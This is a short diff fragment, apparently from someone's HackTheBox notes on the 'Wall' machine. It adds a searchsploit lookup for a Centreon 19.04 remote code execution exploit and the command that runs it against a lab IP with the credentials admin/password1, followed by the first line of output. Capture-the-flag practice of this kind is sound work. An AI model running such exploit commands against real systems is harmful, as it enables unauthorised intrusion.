@@ -54,9 +54,13 @@ https://www.cnn.com/2019/04/22/uk/most-common-passwords-scli-gbr-intl/index.html
 
 
 
+
 Lookup Centreon 19.04 in Searchsploit
 Centreon 19.04  - Remote Code Execution | exploits/php/webapps/47069.py
 
+Execute exploit
+shotop@kali:~/Pentesting/HackTheBox/Boxes/wall/searchsploit$ python /usr/share/exploitdb/exploits/php/webapps/47069.py http://10.10.10.157/centreon admin password1 10.10.10.157 80
+[+] Retrieving CSRF token to submit the login form
 
 
 
